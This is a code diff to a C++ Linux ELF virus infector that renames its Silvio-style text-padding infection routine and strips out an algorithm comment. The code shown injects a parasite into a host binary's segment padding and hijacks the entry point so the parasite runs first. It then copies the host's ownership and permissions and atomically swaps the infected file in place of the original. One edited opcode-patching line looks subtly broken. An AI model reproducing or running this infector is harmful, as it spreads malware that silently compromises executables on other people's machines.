@@ -1,47 +1,10 @@
-#include "infector/silvio.hh"
+#include "infector/padding_infect.hh"
 #include <linux/elf.h>
 #include <linux/limits.h>
 #include "common/file_descriptor.hh"
 #include "common/patch_pattern.hh"
 #include "std/string.hh"
-/********************  ALGORITHM   *********************
 
-
---- Load parasite from file into memory
-1.	Get parasite_size and parasite_code addresss (location in allocated
-memory)
-
-
---- Find padding_size between CODE segment and the NEXT segment after CODE
-segment 2.	CODE segment : increase
-                -> p_filesz 		(by parasite size)
-                -> p_memsz 			(by parasite size)
-        Get and Set respectively,
-        padding_size 	= (offset of next segment (after CODE segment)) - (end
-of CODE segment) parasite_offset = (end of CODE segment) or (end of last section
-of CODE segment)
-
-
----	PATCH Host entry point
-3.	Save original_entry_point (e_entry) and replace it with parasite_offset
-
-
---- PATCH SHT
-4.  Find the last section in CODE Segment and increase -
-        -> sh_size          (by parasite size)
-
-
---- PATCH Parasite offset
-5.	Find and replace Parasite jmp exit addresss with original_entry_point
-
-
----	Inject Parasite to Host @ host_mapping
-6.	Inject parasite code to (host_mapping + parasite_offset)
-
-
-7.	Write infection to disk x_x
-
-*/
 namespace vt::infector {
 namespace {
 struct SilvioElfInfo {
@@ -187,12 +150,8 @@ bool patch_parasite_and_resume_control(
       (int32_t*)(host_mapping.mutable_base() + info.parasite_offset + cur);
 
   *inst = rel;
-
-  // clear op-code bits
-  *inst &= (0b00000011111111111111111111111111);
   // fill in op-code
-  *inst |= (0b00010100000000000000000000000000);
-
+  *inst &= (0b00010111111111111111111111111111);
 #endif
   return true;
 }
@@ -254,8 +213,8 @@ bool get_info(const char* host_mapping, uint64_t parasite_size,
 
 }  // namespace
 
-bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
-                     vt::common::Mmap<PROT_READ> parasite_mapping) {
+bool padding_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
+                      vt::common::Mmap<PROT_READ> parasite_mapping) {
   const Elf64_Ehdr* host_header =
       reinterpret_cast<const Elf64_Ehdr*>(host_mapping.base());
   if (host_header->e_type == ET_REL || host_header->e_type == ET_CORE) {
@@ -266,8 +225,7 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   }
 
   SilvioElfInfo info{};
-  // Get Home size (in bytes) of parasite residence in host
-  // and check if host's home size can accomodate a parasite this big in size
+  // Get padding size in host.
   if (!get_info(host_mapping.base(), parasite_mapping.size(), info)) {
     // printf("Cannot correctly parse host elf\n");
     return false;
@@ -283,25 +241,26 @@ bool silvio_infect64(vt::common::Mmap<PROT_READ | PROT_WRITE> host_mapping,
   // Patch program header table and increase text section size.
   patch_phdr(host_mapping, parasite_mapping.size(), info.patch_entry_idx);
 
-  // Patch section header table to increase text section size
+  // Patch section header table to increase text section size.
   if (!patch_sht(host_mapping, parasite_mapping.size(),
                  info.code_segment_end_offset)) {
     // printf("Failed to patch section header table\n");
     return false;
   }
 
-  // Patch elf header entry point to run the parasite.
+  // Patch elf header entry point to run the parasite first.
   auto original_entry_point = patch_ehdr(host_mapping, info);
 
-  // Inject parasite in Host
+  // Inject parasite.
   memcpy(host_mapping.mutable_base() + info.parasite_offset,
          parasite_mapping.base(), parasite_mapping.size());
 
+  // Patch parasite to resume host code after execution.
   return patch_parasite_and_resume_control(
       original_entry_point, parasite_mapping.size(), host_mapping, info);
 }
 
-bool silvio_infect64(const char* host_path, const char* parasite_path) {
+bool padding_infect64(const char* host_path, const char* parasite_path) {
   vt::common::FileDescriptor host(host_path, O_RDONLY);
   if (!host.valid()) {
     return false;
@@ -333,15 +292,18 @@ bool silvio_infect64(const char* host_path, const char* parasite_path) {
   vt::common::Mmap<PROT_READ | PROT_WRITE> output_host_mapping(
       host_mapping.size(), MAP_SHARED, output.handle(), 0);
 
+  // Make a writable copy of the host.
   memcpy(output_host_mapping.mutable_base(), host_mapping.base(),
          host_mapping.size());
 
   vt::common::Mmap<PROT_READ> parasite_mapping(parasite.file_size(), MAP_SHARED,
                                                parasite.handle(), 0);
-  if (!silvio_infect64(vt::move(output_host_mapping),
-                       vt::move(parasite_mapping))) {
+  if (!padding_infect64(vt::move(output_host_mapping),
+                        vt::move(parasite_mapping))) {
     return false;
   }
+
+  // mimic the original file.
   struct stat s;
   if (fstat(host.handle(), &s) < 0) {
     return false;
@@ -352,6 +314,7 @@ bool silvio_infect64(const char* host_path, const char* parasite_path) {
   if (fchown(output.handle(), s.st_uid, s.st_gid) < 0) {
     return false;
   }
+  // atomic swap and replace the orignal host with our infected one.
   if (rename(tmp, host_path) < 0) {
     return false;
   }
